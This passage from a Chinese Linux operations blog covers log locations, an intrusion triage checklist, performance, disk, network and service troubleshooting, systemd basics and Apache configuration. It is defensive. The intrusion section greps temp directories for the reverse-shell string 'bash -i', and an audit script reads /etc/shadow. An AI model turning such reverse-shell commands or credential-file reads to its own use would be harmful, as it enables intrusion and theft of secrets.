<td><strong>FTP服务器</strong></td>
<td>vsftpd</td>
<td><code>/var/log/vsftpd.log</code> 或 <code>/var/log/xferlog</code></td>
<td>传输日志</td>
</tr>
<tr>
<td></td>
<td>proftpd</td>
<td><code>/var/log/proftpd/</code></td>
<td>传输和错误日志</td>
</tr>
<tr>
<td><strong>容器管理</strong></td>
<td>Docker</td>
<td><code>/var/log/docker.log</code>（或由 systemd 管理）</td>
<td>容器运行日志</td>
</tr>
<tr>
<td><strong>监控工具</strong></td>
<td>Prometheus</td>
<td>自定义目录，通常在 <code>/var/log/prometheus/</code></td>
<td>监控数据及运行日志</td>
</tr>
<tr>
<td><strong>备份工具</strong></td>
<td>rsync</td>
<td>一般无默认日志，需要自行配置</td>
<td>备份传输日志</td>
</tr>
<tr>
<td><strong>代理服务器</strong></td>
<td>Squid Proxy</td>
<td><code>/var/log/squid/</code></td>
<td>访问日志、缓存日志</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="👥-场景-1：疑似入侵排查">👥 场景 1：疑似入侵排查</h3>
<h4 id="检查登录和认证日志">检查登录和认证日志</h4>
<ul>
<li>
<p>✅ 检查登录记录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Debian/Ubuntu</span></span><br><span class="line">last -n 20</span><br><span class="line">lastb</span><br><span class="line">grep <span class="string">&quot;Accepted&quot;</span> /var/log/auth.log</span><br><span class="line">grep <span class="string">&quot;Failed&quot;</span> /var/log/auth.log</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># RHEL/CentOS</span></span><br><span class="line">last</span><br><span class="line">lastb</span><br><span class="line">grep <span class="string">&quot;Accepted&quot;</span> /var/log/secure</span><br><span class="line">grep <span class="string">&quot;Failed&quot;</span> /var/log/secure</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="检查异常账户和-Shell">检查异常账户和 Shell</h4>
<ul>
<li>检查 /etc/passwd 文件是否近期修改过</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stat /etc/passwd</span><br></pre></td></tr></table></figure>
<ul>
<li>检查异常账户和 Shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;($3&lt;1000 &amp;&amp; $1!=&quot;root&quot;)&#123;print $1, $3&#125;&#x27;</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">&#x27;($3 &gt;= 1000) &#123;print &quot;User: &quot;$1&quot;, UID: &quot;$3&#125;&#x27;</span> /etc/passwd</span><br><span class="line">awk -F: <span class="string">&#x27;($7 !~ /\/bin\/(bash|sh|nologin|false)/)&#123;print $1, $7&#125;&#x27;</span> /etc/passwd</span><br><span class="line">grep -E <span class="string">&quot;useradd|adduser&quot;</span> /var/log/auth.log</span><br></pre></td></tr></table></figure>
<ul>
<li>简单shell</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">echo &quot;=== 1. 普通用户账户 (UID &gt;= 1000) ===&quot;</span><br><span class="line">awk -F: &#x27;($3 &gt;= 1000) &#123;print &quot;User: &quot;$1&quot;, UID: &quot;$3&#125;&#x27; /etc/passwd</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;=== 2. 系统账户 (UID 1-999) ===&quot;</span><br><span class="line">awk -F: &#x27;($3 &gt; 0 &amp;&amp; $3 &lt; 1000) &#123;print &quot;System User: &quot;$1&quot;, UID: &quot;$3&#125;&#x27; /etc/passwd</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;=== 3. UID=0账户 (超级管理员) ===&quot;</span><br><span class="line">awk -F: &#x27;($3 == 0) &#123;print &quot;Root-like User: &quot;$1&quot;, UID: &quot;$3&#125;&#x27; /etc/passwd</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;=== 4. 空密码账户（/etc/shadow中密码字段为空） ===&quot;</span><br><span class="line">awk -F: &#x27;($2 == &quot;&quot; || $2 == &quot;*&quot; || $2 == &quot;!&quot;) &#123;print &quot;User with empty or locked password: &quot;$1&#125;&#x27; /etc/shadow</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;=== 5. 无法登录Shell账户（shell为nologin或false） ===&quot;</span><br><span class="line">awk -F: &#x27;($7 ~ /(nologin|false)/) &#123;print &quot;No-login shell user: &quot;$1&quot;, Shell: &quot;$7&#125;&#x27; /etc/passwd</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;=== 6. 最近登录情况（lastlog） ===&quot;</span><br><span class="line">lastlog | head -20</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;=== 7. 检查 /etc/passwd 和 /etc/shadow 最近修改时间 ===&quot;</span><br><span class="line">ls -lh /etc/passwd /etc/shadow</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;=== 8. sudo 权限异常检查（包含 ALL） ===&quot;</span><br><span class="line">sudo grep -R &#x27;ALL&#x27; /etc/sudoers /etc/sudoers.d/ 2&gt;/dev/null || echo &quot;No suspicious sudo entries found&quot;</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;=== 9. 最近新增用户（查看 /etc/passwd 修改时间） ===&quot;</span><br><span class="line">stat /etc/passwd</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">echo &quot;=== 10. 查看所有用户组 ===&quot;</span><br><span class="line">cut -d: -f1 /etc/group | sort</span><br><span class="line">echo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="检查异常进程和连接">检查异常进程和连接</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -eo user,pid,%cpu,%mem,<span class="built_in">command</span> | <span class="built_in">sort</span> -k3 -r | <span class="built_in">head</span> -n 20</span><br><span class="line">ss -tulpn</span><br><span class="line">ss -tunap | grep ESTAB | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -n</span><br></pre></td></tr></table></figure>
<h4 id="检查后门及异常文件">检查后门及异常文件</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -lh &#123;&#125; \;</span><br><span class="line">grep -R <span class="string">&#x27;bash -i&#x27;</span> /tmp /dev/shm /var/tmp/</span><br></pre></td></tr></table></figure>
<h4 id="检查计划任务">检查计划任务</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"><span class="built_in">sudo</span> crontab -l</span><br><span class="line"><span class="built_in">ls</span> -lh /etc/cron.* /var/spool/cron/</span><br><span class="line">find /etc/cron.* -<span class="built_in">type</span> f -mtime -7 -<span class="built_in">exec</span> <span class="built_in">ls</span> -lh &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>🐞 <strong>推荐辅助工具</strong></p>
<ul>
<li><a href="https://www.chkrootkit.org/">Chkrootkit</a>：检测已知 rootkit</li>
<li><a href="https://sourceforge.net/projects/rkhunter/">RKHunter</a>：检测可疑修改和后门</li>
</ul>
</blockquote>
<hr>
<h3 id="⚡-场景-2：性能排查">⚡ 场景 2：性能排查</h3>
<table>
<thead>
<tr>
<th>项</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>us</code> 用户态CPU</td>
<td>用户进程使用的CPU时间</td>
</tr>
<tr>
<td><code>sy</code> 系统态CPU</td>
<td>系统调用和内核时间</td>
</tr>
<tr>
<td><code>ni</code> 修改优先级CPU</td>
<td>修改优先级进程使用时间</td>
</tr>
<tr>
<td><code>id</code> 空闲CPU</td>
<td>空闲时间</td>
</tr>
<tr>
<td><code>wa</code> IO等待</td>
<td>等待磁盘IO时间</td>
</tr>
<tr>
<td><code>hi</code> 硬中断</td>
<td>硬中断时间</td>
</tr>
<tr>
<td><code>si</code> 软中断</td>
<td>软中断时间</td>
</tr>
<tr>
<td><code>st</code> 被偷取时间</td>
<td>虚拟化环境CPU被其他宿主占用时间</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>项</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>total</td>
<td>总内存</td>
</tr>
<tr>
<td>free</td>
<td>完全空闲内存</td>
</tr>
<tr>
<td>used</td>
<td>已使用(不含cache/buff)</td>
</tr>
<tr>
<td>buff/cache</td>
<td>文件缓存和缓冲</td>
</tr>
<tr>
<td>Swap</td>
<td>交换空间 (SWAP)</td>
</tr>
<tr>
<td>avail Mem</td>
<td>可供新应用使用的实际内存</td>
</tr>
</tbody>
</table>
<h4 id="检查负载和-CPU">检查负载和 CPU</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uptime</span></span><br><span class="line">top -bn1 | <span class="built_in">head</span> -n 20</span><br><span class="line">mpstat -P ALL 1 5</span><br><span class="line">vmstat 1 5</span><br></pre></td></tr></table></figure>
<h4 id="检查磁盘和-IO">检查磁盘和 IO</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"><span class="built_in">du</span> -sh /* 2&gt;/dev/null | <span class="built_in">sort</span> -h</span><br><span class="line">iostat -x 1 5</span><br></pre></td></tr></table></figure>
<h4 id="检查内存和交换空间">检查内存和交换空间</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">free -h</span><br><span class="line"><span class="built_in">cat</span> /proc/meminfo | egrep <span class="string">&#x27;MemAvailable|MemFree|SwapTotal|SwapFree&#x27;</span></span><br><span class="line">ps -eo user,pid,%mem,<span class="built_in">command</span> | <span class="built_in">sort</span> -k3 -r | <span class="built_in">head</span> -n 20</span><br></pre></td></tr></table></figure>
<blockquote>
<p>⚡️ <strong>推荐辅助工具</strong></p>
<ul>
<li><a href="https://htop.dev/">htop</a>：更直观的CPU、MEM、IO监控</li>
<li><a href="https://github.com/dstat-io/dstat">dstat</a>：综合性能监控</li>
<li><a href="https://nicolargo.github.io/glances/">glances</a>：一键看全局性能</li>
</ul>
</blockquote>
<hr>
<h3 id="💽-场景-3：磁盘空间排查">💽 场景 3：磁盘空间排查</h3>
<h4 id="检查空间概况">检查空间概况</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"><span class="built_in">du</span> -sh /* 2&gt;/dev/null | <span class="built_in">sort</span> -h</span><br></pre></td></tr></table></figure>
<h4 id="找出大文件">找出大文件</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -size +100M -<span class="built_in">exec</span> <span class="built_in">ls</span> -lh &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<h4 id="检查挂载和-IO-性能">检查挂载和 IO 性能</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount | column -t</span><br><span class="line">iostat -x 1 5</span><br></pre></td></tr></table></figure>
<blockquote>
<p>⚡️ <strong>推荐辅助工具</strong></p>
<ul>
<li><a href="https://dev.yorhel.nl/ncdu">ncdu</a>：以更友好的UI检视磁盘空间使用状况</li>
<li><a href="http://guichaz.free.fr/iotop/">iotop</a>：监控磁盘IO热点进程</li>
</ul>
</blockquote>
<hr>
<h3 id="🌐-场景-4：网络排查">🌐 场景 4：网络排查</h3>
<h4 id="检查连接状态和端口">检查连接状态和端口</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulpn</span><br><span class="line">ss -tunap | <span class="built_in">sort</span> -k5</span><br></pre></td></tr></table></figure>
<h4 id="检查异常连接和速率">检查异常连接和速率</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tunap | grep ESTAB | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -n</span><br><span class="line">sar -n DEV 1 5</span><br></pre></td></tr></table></figure>
<h4 id="检查丢包和错误">检查丢包和错误</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">ip -s <span class="built_in">link</span></span><br></pre></td></tr></table></figure>
<h4 id="web访问次数统计">web访问次数统计</h4>
<p>Nginx/Apache 标准格式，日志文件名是 access.log</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LOGFILE=<span class="string">&quot;access.log&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;==== IP 访问次数 ====&quot;</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> <span class="variable">$LOGFILE</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n==== 站点路径访问次数 ====&quot;</span></span><br><span class="line"><span class="comment"># 提取请求路径，去除参数</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> <span class="variable">$LOGFILE</span> | <span class="built_in">cut</span> -d<span class="string">&#x27;?&#x27;</span> -f1 | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n==== HTTP 方法统计 ====&quot;</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print $6&#125;&#x27;</span> <span class="variable">$LOGFILE</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;&quot;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n==== 状态码统计 ====&quot;</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> <span class="variable">$LOGFILE</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure>
<blockquote>
<p>⚡️ <strong>推荐辅助工具</strong></p>
<ul>
<li><a href="https://www.roland-riegel.de/nload/">nload</a>：简单直观的网络监控</li>
<li><a href="https://www.ex.parsed.org/iftop/">iftop</a>：监控实时带宽和连接</li>
<li><a href="https://www.tcpdump.org/">tcpdump</a>：精准抓取网络数据和分析</li>
</ul>
</blockquote>
<hr>
<h3 id="⚡-场景-5：服务和应用排查">⚡ 场景 5：服务和应用排查</h3>
<h4 id="检查服务状态和日志">检查服务状态和日志</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status &lt;service_name&gt;</span><br><span class="line">journalctl -xe | <span class="built_in">tail</span> -n 30</span><br></pre></td></tr></table></figure>
<h4 id="检查日志位置参考表">检查日志位置参考表</h4>
<table>
<thead>
<tr>
<th>服务</th>
<th>Debian/Ubuntu 路径</th>
<th>RHEL 路径</th>
</tr>
</thead>
<tbody>
<tr>
<td>SSH</td>
<td>/var/log/auth.log</td>
<td>/var/log/secure</td>
</tr>
<tr>
<td>通用日志</td>
<td>/var/log/syslog</td>
<td>/var/log/messages</td>
</tr>
<tr>
<td>Nginx</td>
<td>/var/log/nginx/error.log</td>
<td>/var/log/nginx/error.log</td>
</tr>
<tr>
<td>Apache</td>
<td>/var/log/apache2/error.log</td>
<td>/var/log/httpd/error_log</td>
</tr>
<tr>
<td>MySQL</td>
<td>/var/log/mysql/error.log</td>
<td>/var/log/mysqld.log</td>
</tr>
</tbody>
</table>
<h4 id="检查端口和连接">检查端口和连接</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulpn | grep &lt;port&gt;</span><br><span class="line">lsof -i :&lt;port&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>⚡️ <strong>推荐辅助工具</strong></p>
<ul>
<li><a href="https://www.logwatch.org/">logwatch</a>：日志解析和总结</li>
<li><a href="https://lnav.org/">lnav</a>：更友好的日志分析器</li>
</ul>
</blockquote>
<hr>
<h3 id="🕵️-场景-6：配置和修改排查">🕵️ 场景 6：配置和修改排查</h3>
<h4 id="检查修改过的配置">检查修改过的配置</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /etc -<span class="built_in">type</span> f -mtime -3 -<span class="built_in">exec</span> <span class="built_in">ls</span> -lh &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<h4 id="检查-RPM-或-Debian-包是否被修改">检查 RPM 或 Debian 包是否被修改</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -Va | egrep -v <span class="string">&#x27;c|missing|prelink|ghost&#x27;</span></span><br><span class="line">debsums -c</span><br></pre></td></tr></table></figure>
<h4 id="检查-SUID-文件">检查 SUID 文件</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -lh &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>⚡️ <strong>推荐辅助工具</strong></p>
<ul>
<li><a href="https://aide.github.io/">aide</a>：文件完整性检测</li>
<li><a href="https://sourceforge.net/projects/tripwire/">Tripwire</a>：老牌文件修改检测器</li>
</ul>
</blockquote>
<hr>
<h3 id="⚡-场景-7：硬件和崩溃排查">⚡ 场景 7：硬件和崩溃排查</h3>
<h4 id="检查硬件错误和日志">检查硬件错误和日志</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dmesg | <span class="built_in">tail</span> -n 100</span><br><span class="line">journalctl -k | <span class="built_in">tail</span> -n 100</span><br></pre></td></tr></table></figure>
<h4 id="检查磁盘和-SMART-状态">检查磁盘和 SMART 状态</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smartctl -a /dev/sda</span><br></pre></td></tr></table></figure>
<h4 id="检查-CPU-和温度">检查 CPU 和温度</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lscpu</span><br><span class="line">sensors</span><br></pre></td></tr></table></figure>
<blockquote>
<p>⚡️ <strong>推荐辅助工具</strong></p>
<ul>
<li><a href="https://kernel.ubuntu.com/~cking/stress-ng/">stress-ng</a>：硬件压力测试</li>
<li><a href="https://www.hwinfo.org/">hwinfo</a>：硬件检测和日志采集</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>linux命令</tag>
        <tag>系统运维</tag>
      </tags>
  </entry>
  <entry>
    <title>linux服务管理入门</title>
    <url>/2025/06/24/linux%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h2 id="基本操作">基本操作</h2>
<h3 id="查看服务">查看服务</h3>
<ul>
<li>列出所有服务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl list-units --type=service</span><br></pre></td></tr></table></figure>
<ul>
<li>列出所有已启用的服务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl list-unit-files --state=enabled</span><br></pre></td></tr></table></figure>
<h3 id="查看日志">查看日志</h3>
<ol>
<li>journalctl -u <service> — 查看指定服务日志</li>
<li>journalctl -xe — 检查最新日志，排查错误</li>
</ol>
<hr>
<h2 id="额外技能">额外技能</h2>
<h3 id="检查依赖">检查依赖</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl list-dependencies &lt;service&gt;</span><br></pre></td></tr></table></figure>
<h3 id="修改配置">修改配置</h3>
<ol>
<li>配置文件位置通常是：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/systemd/system/</span><br><span class="line">/lib/systemd/system/</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>修改后：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>重启服务使修改生效</li>
</ol>
<hr>
<h2 id="其他管理器概览">其他管理器概览</h2>
<p>虽说 systemd 完全是主流，但是还有其他管理器的使用：</p>
<h3 id="SysV-管理器：">SysV 管理器：</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service &lt;service&gt; start|stop|restart|status</span><br><span class="line">chkconfig &lt;service&gt; on|off</span><br></pre></td></tr></table></figure>
<h3 id="Upstart-管理器：">Upstart 管理器：</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">initctl list</span><br><span class="line">initctl start|stop|restart &lt;service&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>基础学习篇</category>
      </categories>
      <tags>
        <tag>系统运维</tag>
        <tag>linux</tag>
        <tag>linux服务</tag>
      </tags>
  </entry>
  <entry>
    <title>linux系统的基础操作</title>
    <url>/2025/06/22/linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="文件管理">文件管理</h2>
<h3 id="文件和目录操作">文件和目录操作</h3>
<ul>
<li>常见命令
<ol>
<li>创建：</li>
</ol>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">创建文件：touch/vim/vi filename</span><br><span class="line">创建目录：mkdir dir_name</span><br></pre></td></tr></table></figure>
<pre><code>2. 删除：
</code></pre>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">文件：rm filename</span><br><span class="line">递归删除目录：rm -r dir_name</span><br></pre></td></tr></table></figure>
<pre><code>3. 移动、重命名：
</code></pre>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv old_name new_name</span><br></pre></td></tr></table></figure>
<pre><code>4. 复制：
</code></pre>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp source_file dest_file／cp -r dir1 dir2</span><br></pre></td></tr></table></figure>
<pre><code>5. 列出：
</code></pre>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">简单列出：ls</span><br></pre></td></tr></table></figure>
<h3 id="文件属性和权限">文件属性和权限</h3>
<ul>
<li>r(读)、w(写)、x(执行)权限</li>
<li>修改所有者和群组：
<ul>
<li>chown user:group filename</li>
</ul>
</li>
<li>修改权限：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">符号法：chmod u+x script.sh （为owner增加执行权）</span><br><span class="line">数值法：chmod 755 script.sh</span><br></pre></td></tr></table></figure>
<h3 id="文件内容操作">文件内容操作</h3>
<ul>
<li>cat、less、more：快速查看</li>
<li>head／tail：显示文件头尾</li>
<li>grep：搜索文本</li>
<li>示例：grep “error” /var/log/syslog</li>
</ul>
<hr>
<h2 id="用户管理">用户管理</h2>
<h3 id="用户和组">用户和组</h3>
<ul>
<li>每个用户都有一个UID。</li>
<li>每个组都有一个GID。</li>
<li>管理文件：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd 用户账号信息</span><br><span class="line">/etc/group 组账号信息</span><br><span class="line">/etc/shadow 用户密码和过期时间</span><br></pre></td></tr></table></figure>
<h3 id="创建和修改">创建和修改</h3>
<ul>
<li>创建用户：useradd newuser</li>
<li>删除用户：userdel newuser</li>
<li>修改属性：
<ul>
<li>修改主目录：usermod -d /new/path user</li>
<li>修改 Shell：usermod -s /bin/bash user</li>
</ul>
</li>
<li>修改密码：
<ul>
<li>passwd user</li>
</ul>
</li>
</ul>
<h3 id="管理组">管理组</h3>
<ul>
<li>创建组：groupadd groupname</li>
<li>修改组：groupmod -n newname oldname</li>
<li>删除组：groupdel groupname</li>
<li>将用户加入组：usermod -aG groupname username</li>
</ul>
<h3 id="权限验证">权限验证</h3>
<ul>
<li>id user：显示 UID、GID。</li>
<li>groups user：列出用户所在的组。</li>
<li>whoami：显示当前登录的用户名。</li>
</ul>
<hr>
<h2 id="磁盘管理">磁盘管理</h2>
<h3 id="磁盘概念">磁盘概念</h3>
<ul>
<li>分区和挂载：
<ul>
<li>分区：<code>/dev/sda1</code>、<code>/dev/sda2</code> 等。</li>
<li>挂载点：<code>/mnt</code>、<code>/media</code>、<code>/home</code> 等。</li>
</ul>
</li>
<li>文件系统：<code>ext4</code>、<code>xfs</code>、<code>btrfs</code> 等。</li>
</ul>
<h3 id="管理命令">管理命令</h3>
<ul>
<li>检查磁盘和分区：
<ul>
<li><code>lsblk</code>：列出所有块设备。</li>
<li><code>fdisk -l</code>：列出分区。</li>
</ul>
</li>
<li>创建分区：
<ul>
<li><code>fdisk /dev/sda</code> 或 <code>parted /dev/sda</code></li>
</ul>
</li>
<li>创建文件系统：
<ul>
<li><code>mkfs.ext4 /dev/sda1</code></li>
</ul>
</li>
<li>挂载：
<ul>
<li>挂载分区：<code>mount /dev/sda1 /mnt</code></li>
<li>检查挂载：<code>mount | df -h</code></li>
</ul>
</li>
<li>自动挂载：
<ul>
<li>
<p>修改<code>/etc/fstab</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/dev/sda1 /data ext4 defaults 0 2</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>位置</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>/dev/sda1</code></td>
<td><strong>设备</strong>，表示磁盘分区的位置。</td>
</tr>
<tr>
<td><code>/data</code></td>
<td><strong>挂载点</strong>，这个分区挂载到哪里。</td>
</tr>
<tr>
<td><code>ext4</code></td>
<td><strong>文件系统类型</strong>，这个分区采用的文件系统格式。</td>
</tr>
<tr>
<td><code>defaults</code></td>
<td><strong>挂载参数</strong>，默认选项，等价于<code>rw,suid,dev,exec,auto,nouser,async</code> 等。</td>
</tr>
<tr>
<td><code>0</code></td>
<td><strong>dump标记</strong>，是否对这个分区进行 dump 备份，<code>0</code>表示不需要，<code>1</code>表示需要。</td>
</tr>
<tr>
<td><code>2</code></td>
<td><strong>fsck检查顺序</strong>，开机时 <code>fsck</code> 检查磁盘顺序：<br>– <code>0</code> 不检查<br>– <code>1</code> 检查优先（通常是<code>/</code>）<br>– <code>2</code> 检查次优先（其他分区）。</td>
</tr>
</tbody>
</table>
<ul>
<li>卸载：
<ul>
<li><code>umount /mnt</code></li>
</ul>
</li>
</ul>
<h3 id="磁盘空间检查">磁盘空间检查</h3>
<ul>
<li>
<p>检查磁盘使用量：<code>df -h</code></p>
</li>
<li>
<p>检查大文件或大目录：</p>
<ul>
<li><code>du -sh /path</code></li>
<li><code>ncdu</code> (交互式)</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>基础学习篇</category>
      </categories>
      <tags>
        <tag>系统运维</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx和apache-简单配置</title>
    <url>/2025/06/23/nginx%E5%92%8Capache/</url>
    <content><![CDATA[<h2 id="Apache-配置">Apache 配置</h2>
<blockquote>
<p>一般配置文件位置：</p>
<ul>
<li>Debian/Ubuntu: <code>/etc/apache2/sites-available/000-default.conf</code></li>
<li>CentOS/RHEL: <code>/etc/httpd/conf.d/</code></li>
</ul>
<p>启动/重启命令：</p>
<ul>
<li>Debian/Ubuntu: <code>sudo systemctl restart apache2</code></li>
<li>CentOS/RHEL: <code>sudo systemctl restart httpd</code></li>
</ul>
</blockquote>
<h3 id="示例配置">示例配置</h3>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerName</span> www.example.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> /var/www/html</span><br><span class="line"></span><br><span class="line">    <span class="section">&lt;Directory /var/www/html&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> Indexes FollowSymLinks</span><br><span class="line">        <span class="attribute">AllowOverride</span> None</span><br><span class="line">        <span class="attribute">Require</span> <span class="literal">all</span> granted</span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">ErrorLog</span> /var/log/httpd/html_error.log</span><br><span class="line">    <span class="attribute">CustomLog</span> /var/log/httpd/html_access.log combined</span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li><code>ServerName</code>：指定主机名。</li>
<li><code>DocumentRoot</code>：指定网站根目录。</li>
<li><code>&lt;Directory&gt;</code>：设置对该目录的访问规则。</li>
</ul>
<h3 id="其他">其他</h3>
<h4 id="禁用默认欢迎页面">禁用默认欢迎页面</h4>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CentOS手动禁用默认配置文件或者删除欢迎页面配置</span></span><br><span class="line"><span class="attribute">sudo</span> mv /etc/httpd/conf.d/welcome.conf /etc/httpd/conf.d/welcome.conf.disabled</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu禁用默认站点</span></span><br><span class="line"><span class="attribute">sudo</span> a2dissite <span class="number">000</span>-default.conf</span><br></pre></td></tr></table></figure>
<h4 id="防止泄漏Apache版本信息">防止泄漏Apache版本信息</h4>
<p>新增一个安全配置文件security.conf</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ServerTokens</span> Prod</span><br><span class="line"><span class="attribute">ServerSignature</span> <span class="literal">Off</span></span><br></pre></td></tr></table></figure>
<h3 id="检查配置情况">检查配置情况</h3>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">apachectl</span> configtest</span><br></pre></td></tr></table></figure>
<hr>
